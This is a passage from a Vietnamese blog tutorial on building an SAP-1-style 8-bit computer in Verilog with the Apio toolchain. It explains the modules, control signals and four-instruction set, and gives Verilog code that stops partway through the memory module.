<p>Mình cũng từng là 1 người như thế, mình có ý tưởng mơ hồ về cách máy tính hoạt động: lập trình code, dịch code xuống mã nhị phân, máy tính đọc mã nhị phân rồi chạy. Nhưng mà mình không hiểu rõ máy tính làm gì để dịch code xuống mã nhị phân và làm gì với mã nhị phân để chạy chương trình. Thế nên mình quyết định là mình sẽ tìm hiểu về cách máy tính hoạt động. Và cách tìm hiểu về 1 cái gì đó tốt nhất là <em>tự tay</em> làm cái gì đó.</p>
<p>Lúc mình mới bắt đầu dự án này thì mình cũng muốn làm máy tính trên bảng cắm dây như <a href="https://www.youtube.com/playlist?list=PLowKtXNTBypGqImE405J2565dvjafglHU">Ben Eater</a>. Nhưng mình nhận ra là mình không có tiền để mua các bộ phận cần thiết để làm máy tính, thế nên mình quyết định là làm máy tính này bằng phần mềm. Và bởi vì mình cũng đang học <em>Verilog</em>, mình quyết định là sẽ dùng <em>Verilog</em> để làm máy tính này.</p>
<hr>
<h2 id="môi-trường-phát-triển-fpga">Môi trường phát triển FPGA</h2>
<p>Mình muốn sử dụng các công cụ phát triển FPGA mã nguồn mở như là: GTKWave, iverilog, yosys, vv. Mình tìm được công cự gọi là <a href="https://github.com/FPGAwars/apio"><em>Apio</em></a>. Nó như là 1 hộp dụng cụ có chứa các công cụ phát triển FPGA mã nguồn mở. Thế nên mình quyết định là sẽ dùng <em>Apio</em>.</p>
<p>Cách tải Apio:</p>
<ul>
<li>Tải <a href="https://www.python.org/downloads/">Python</a></li>
<li>Tải Apio với <code>pip</code> (nếu như không có <code>pip</code> thì chạy <code>easy_install pip</code>)</li>
</ul>
<pre tabindex="0"><code>$ pip install -U apio
</code></pre><ul>
<li>Tải các package cần thiết:</li>
</ul>
<pre tabindex="0"><code>$ apio install -a
</code></pre><p>Thế là tải xong Apio. Xem trang <a href="https://apiodoc.readthedocs.io/en/stable/source/quick_start.html">quick start</a> của Apio để học cách dùng nó.</p>
<hr>
<h2 id="cấu-trúc-của-máy-tính">Cấu trúc của máy tính</h2>
<p>Mình dựa cấu trúc của máy tính này trên máy tính <em>SAP-1</em> trong <a href="https://www.amazon.com/Digital-Computer-Electronics-Jerald-Malvino-dp-0074622358/dp/0074622358/ref=dp_ob_image_bk">Digital Computer Electronics</a>.</p>
<p><img src="/img/8bit-computer/8bit-architecture.png" alt="8bit architecture pic"></p>
<p>Các mô-đun đều có 1 vài tín hiệu giống nhau: <em>clk</em>, <em>rst</em> và <em>out</em>.</p>
<ul>
<li><em>clk</em>: Tín hiệu của clock</li>
<li><em>rst</em>: Tín hiệu cài đặt lại (Chuyển mọi thứ trở về 0)</li>
<li><em>out</em>: Đường truyền ra của mô-đun (kết nối với bus để các mô-đun có thể giao tiếp, truyền dữ liệu cho nhau)</li>
</ul>
<p>Cấu trúc của mình có 1 vài điểm khác so với cấu trúc của <em>SAP-1</em>. Mình kết hợp mô-đun <em>MAR</em> với mô-đun <em>RAM</em> để tạo nên mô-đun memory (bộ nhớ). Một vài đường tín hiệu có có tên khác so với <em>SAP-1</em> bởi vì mình đang dựa trên cấu trúc <em>SAP-1</em> trong trí nhớ mình.</p>
<p>Cấu trúc này sẽ không giống <em>SAP-1</em> 100% nhưng nó vẫn sẽ là 1 máy tính 8-bit hoàn chỉnh.</p>
<p>Với cấu trúc hệ thống hoàn thiện rồi thì mình sẽ bắt đầu làm máy tính này.</p>
<hr>
<h2 id="giải-thích-các-mô-đun">Giải thích các mô-đun</h2>
<p>Đây là cách hoạt động của các mô-đun trong máy tính:</p>
<ol>
<li><em>Bus</em>: Đây là nơi mà mọi dữ liệu sẽ được truyền qua. Nó rộng 8-bit và nó là đường giao tiếp và truyền dữ liệu giữa các mô-đun khác nhau. Bus sẽ có các tín hiệu <em>enable</em> để có thể chọn mô-đun nào sẽ được truyền thông tin qua bus tại 1 thời điểm nhất định.</li>
<li><em>Clock</em>: Mô-đun này sẽ đồng bộ hóa các mô-đun trong máy tính. Nó như là nhạc trưởng điều hành 1 ban nhạc. Mô-đun này sẽ cho tín hiệu <em>clk_in</em> đi qua nếu như tín hiệu <em>hlt</em> là 0, và sẽ cho tín hiệu 0 đi qua nếu như <em>hlt</em> là 1. Tín hiệu <em>hlt</em> là tín hiệu halt (ngừng). Nó dược dùng để làm cho máy tính ngừng việc thực thi câu lệnh.</li>
<li><em>Program Counter (Bộ đếm chương trình)</em>: Mô-đun này sẽ lưu địa chỉ của câu lệnh cần được thực thi. Bởi vì bộ nhớ của máy tính này chỉ có 16 byte, mô-đun này sẽ đếm từ địa chỉ <code>0x0</code> đến địa chỉ <code>0xF</code> (đó là số thập lục phân). Tín hiệu <em>inc</em> là tín hiệu cho mô-đun này biết là nó cần đếm đến địa chỉ tiếp theo.</li>
<li><em>Instruction Register (Thanh ghi câu lệnh)</em>: Mô-đun này sẽ load câu lệnh từ bộ nhớ và tách opcode và địa chỉ dữ liệu với nhau. <em>Opcode</em> là mã của câu lệnh. Máy tính sẽ đọc opcode để biết được câu lệnh nào cần được thực thi. Mỗi câu lệnh sẽ là <em>8-bit</em>, 4 bit đầu tiên sẽ là opcode, 4 bit cuối cùng sẽ là địa chỉ của dữ liệu mà câu lệnh đó sử dụng. Với các câu lệnh mà không cần dữ liệu (như là <strong>HLT</strong>) thì 4 bit cuối sẽ không được đọc.</li>
<li><em>Thanh ghi A</em>: Đây là thanh ghi chính của máy tính. Nó là thanh ghi lưu trữ dự liệu chính trong lúc thực thi câu lệnh. Nó cần tín hiệu <em>load</em> để có thể load dữ liệu từ bộ nhớ vào.</li>
<li><em>Thanh ghi B</em>: Đây là thanh ghi hỗ trợ của máy tính. Nó được dùng để lưu dữ liệu được sử dụng cho việc tính toán với dữ liệu trong thanh ghi A. Nó cũng sử dụng tín hiệu <em>load</em> để load dữ liệu từ bộ nhớ vào.</li>
<li><em>Adder</em>: Đây là mô-đun phụ trách việc tính toán với dự liệu trong bộ nhớ. Nó có thể cộng (A + B) hoặc trừ (A - B). Nó không cần tín hiệu clock bởi vì nó luôn luôn tính toán và cho ra kết quả dựa trên giá trị trong thanh ghi A và B.</li>
<li><em>Memory (Bộ nhớ)</em>: Đây là bộ nhớ 16 byte của máy tính. Mô-đun này có thanh ghi 4-bit gọi là <em>Memory Address Register</em> (<em>MAR</em>), dịch ra tiếng việt, thanh ghi này là <em>thanh ghi địa chỉ bộ nhớ</em>. Thanh ghi này có trách nghiệm là tạm thời lưu trữ địa chỉ của câu lệnh hay dữ liệu cần lấy trong bộ nhớ. Địa chỉ trong <em>MAR</em> sẽ được gửi vào bộ nhớ và từ đó mà câu lệnh hoặc dữ liệu sẽ được đọc. Máy tính này cần <em>2 chu kỳ clock</em> để đọc từ bộ nhớ: Chu kỳ 1 sẽ load địa chỉ cần đọc vào trong <em>MAR</em>; Chu kỳ 2 sẽ đọc dữ liệu trong bộ nhớ từ địa chỉ chứa trong <em>MAR</em>. Máy tính sẽ load dữ liệu vào trong bộ nhớ nhờ file <em>program.bin</em>.</li>
<li><em>Controller (Bộ điều khiển)</em>: Đây là mô-đun phức tạp nhất trong máy tính này. Nó sẽ quyết định hành động tiếp theo của máy tính bằng cách gửi các <em>tín hiệu điều khiển</em> (có <em>12 tín hiệu</em> điều khiển khác nhau) cho các mô-đun khác nhau. Mình sẽ giải thích các tín hiệu điều khiển trong phần tiếp theo.</li>
</ol>
<h2 id="các-giai-đoạn-thực-thi-câu-lệnh">Các giai đoạn thực thi câu lệnh:</h2>
<p>Việc thực thi câu lệnh xảy ra trong nhiều <em>đoạn</em> (mỗi đoạn sẽ mất 1 chu kỳ clock). Máy tính này có <em>6 đoạn</em> thực thi (<strong>0</strong> đến <strong>5</strong>). Nó sẽ bắt đầu từ đoạn 0, đếm lên đoạn 5 và quay lại đoạn 0 (nó sẽ đếm bằng thanh ghi 3-bit).</p>
<p><em>Opcode</em> sẽ được truyền vào <em>thanh ghi câu lệnh</em> và rồi được truyền vào <em>bộ điều khiển</em> để nó có thể gửi các tín hiệu điều khiển cho các mô-đun trong máy tính. Đầu ra của <em>bộ điều khiển</em> sẽ là 12 tín hiệu điều khiển, được sử dụng để điều khiển hành động của các mô-đun khác nhau. Mỗi đoạn thực thi của câu lệnh khác nhau sẽ cần tổ hợp tín hiệu điều khiển khác nhau để làm điều khác nhau.</p>
<p>Tín hiệu điều khiển:</p>
<ul>
<li><em>hlt</em>: dừng thực thi lệnh</li>
<li><em>pc_inc</em>: tăng bộ đếm chương trình (<em>PC</em>)</li>
<li><em>pc_en</em>: cho dữ liệu trong <em>PC</em> lên bus</li>
<li><em>mar_load</em>: cho địa chỉ cần truy cập vào <em>MAR</em></li>
<li><em>mem_en</em>: cho dữ liệu trong bộ nhớ lên bus</li>
<li><em>ir_load</em>: cho dữ liệu trong bus vào thanh ghi câu lệnh (<em>IR</em>)</li>
<li><em>ir_en</em>: cho dữ liệu trong ir lên bus</li>
<li><em>a_load</em>: cho dữ liệu trong bus vào thanh ghi A</li>
<li><em>a_en</em>: cho dữ liệu trong thanh ghi A lên bus</li>
<li><em>b_load</em>: cho dữ liệu trong bus vào thanh ghi B</li>
<li><em>adder_sub</em>: chuyển adder sang chế độ trừ (A - B)</li>
<li><em>adder_en</em>: cho dữ liệu trong adder lên bus</li>
</ul>
<h2 id="câu-lệnh-của-máy-tính">Câu lệnh của máy tính</h2>
<p>Máy tính này có <strong>4</strong> câu lệnh:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: center">Opcode</th>
          <th>Câu lệnh</th>
          <th>Miêu tả</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center"><em>0000</em></td>
          <td><strong>LDA $x</strong></td>
          <td>Cho dữ liệu tại địa chỉ <em>$x</em> trong bộ nhớ vào A</td>
      </tr>
      <tr>
          <td style="text-align: center"><em>0001</em></td>
          <td><strong>ADD $x</strong></td>
          <td>Cộng dữ liệu tại địa chỉ <em>$x</em> trong bộ nhớ với dữ liệu trong A</td>
      </tr>
      <tr>
          <td style="text-align: center"><em>0010</em></td>
          <td><strong>SUB $x</strong></td>
          <td>Trừ dữ liệu trong A với dữ liệu trong bộ nhớ tại địa chỉ $x</td>
      </tr>
      <tr>
          <td style="text-align: center"><em>1111</em></td>
          <td><strong>HLT</strong></td>
          <td>Ngừng việc thực thi câu lệnh của máy tính</td>
      </tr>
  </tbody>
</table>
<p>Câu lệnh nào cũng có <em>3 đoạn đầu</em> giống nhau:</p>
<ul>
<li><strong>Đoạn 0</strong>: Cho dữ liệu trong <em>PC</em> lên bus và load dữ liệu đó vào <em>MAR</em> (<em>pc_en</em> -&gt; <em>mar_load</em>)</li>
<li><strong>Đoạn 1</strong>: Tăng dữ liệu trong <em>PC</em> (<em>pc_inc</em>)</li>
<li><strong>Đoạn 2</strong>: Cho dữ liệu trong bộ nhớ tại địa chỉ <em>MAR</em> lên bus và load dữ liệu đó vào <em>IR</em> (<em>mem_en</em> -&gt; <em>ir_load</em>)</li>
</ul>
<p>Mỗi câu lệnh khác nhau sẽ có <em>3 đoạn cuối</em> khác nhau:</p>
<table>
  <thead>
      <tr>
          <th>Đoạn</th>
          <th>LDA</th>
          <th>ADD</th>
          <th>SUB</th>
          <th>HLT</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>Đoạn 3</strong></td>
          <td>Cho dữ liệu trong <em>IR</em> lên bus và load dữ liệu đó vào <em>MAR</em> (<em>ir_en</em> -&gt; <em>mar_load</em>)</td>
          <td>Cho dữ liệu trong <em>IR</em> lên bus và load dữ liệu đó vào <em>MAR</em> (<em>ir_en</em> -&gt; <em>mar_load</em>)</td>
          <td>Cho dữ liệu trong <em>IR</em> lên bus và load dữ liệu đó vào <em>MAR</em> (<em>ir_en</em> -&gt; <em>mar_load</em>)</td>
          <td>Ngừng clock (<em>hlt</em>)</td>
      </tr>
      <tr>
          <td><strong>Đoạn 4</strong></td>
          <td>Cho dữ liệu trong bộ nhớ tại địa chỉ <em>MAR</em> lên bus và load dữ liệu đó vào <em>A</em> (<em>mem_en</em> -&gt; <em>a_load</em>)</td>
          <td>Cho dữ liệu trong bộ nhớ tại địa chỉ <em>MAR</em> lên bus và load dữ liệu đó vào <em>B</em> (<em>mem_en</em> -&gt; <em>b_load</em>)</td>
          <td>Cho dữ liệu trong bộ nhớ tại địa chỉ <em>MAR</em> lên bus và load dữ liệu đó vào <em>B</em> (<em>mem_en</em> -&gt; <em>b_load</em>)</td>
          <td>Chạy không (Idle)</td>
      </tr>
      <tr>
          <td><strong>Đoạn 5</strong></td>
          <td>Chạy không (Idle)</td>
          <td>Cho dữ liệu ở đầu ra của <em>adder</em> lên bus và load dữ liệu đó vào <em>A</em> (<em>adder_en</em> -&gt; <em>a_load</em>)</td>
          <td>Chuyển <em>adder</em> sang chế độ trừ và cho dữ liệu ở đầu ra của <em>adder</em> lên bus và load dữ liệu đó vào <em>A</em> (<em>adder_sub</em> -&gt; <em>adder_en</em> -&gt; <em>a_load</em>)</td>
          <td>Chạy không (Idle)</td>
      </tr>
  </tbody>
</table>
<h2 id="lập-trình-verilog">Lập trình Verilog</h2>
<p>Các mô-đun này sẽ được lập trình trong ngôn ngữ <em>Verilog</em>. Máy tính này sẽ có mô-đun tên là <code>top_design</code> để kết nối các mô-đun này với nhau. Mình sẽ lập trình <em>testbench</em> cho mô-đun <code>top_design</code> này để kiểm tra xem máy tính có hoạt động đúng hay không.</p>
<h3 id="clock">Clock</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">clock</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">hlt</span>, <span style="color:#7f848e">// tín hiệu halt
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk_in</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span> <span style="color:#e06c75">clk_out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">clk_out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">hlt</span> <span style="color:#56b6c2">?</span> <span style="color:#d19a66">1</span><span style="color:#d19a66">&#39;b0</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">clk_in</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h3 id="program-counter-bộ-đếm-chương-trình">Program Counter (Bộ đếm chương trình)</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">pc</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">inc</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">pc</span>;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">pc</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">inc</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">pc</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">pc</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pc</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h3 id="instruction-register-thanh-ghi-câu-lệnh">Instruction Register (Thanh ghi câu lệnh)</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">ir</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">load</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ir</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">ir</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">load</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">ir</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ir</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h3 id="thanh-ghi-a">Thanh ghi A</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">reg_a</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">load</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">reg_a</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">reg_a</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">load</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">reg_a</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">reg_a</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h3 id="thanh-ghi-b">Thanh ghi B</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">reg_b</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">load</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">reg_b</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">reg_b</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">load</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">reg_b</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">reg_b</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h3 id="adder">Adder</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">adder</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">a</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">b</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">sub</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">sub</span> <span style="color:#56b6c2">?</span> <span style="color:#e06c75">a</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">b</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">a</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">b</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h3 id="memory-bộ-nhớ">Memory (Bộ nhớ)</h3>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">memory</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">load</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">// thiết lập bộ nhớ
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">initial</span> <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e5c07b">$readmemh</span>(<span style="color:#98c379">&#34;program.bin&#34;</span>, <span style="color:#e06c75">ram</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
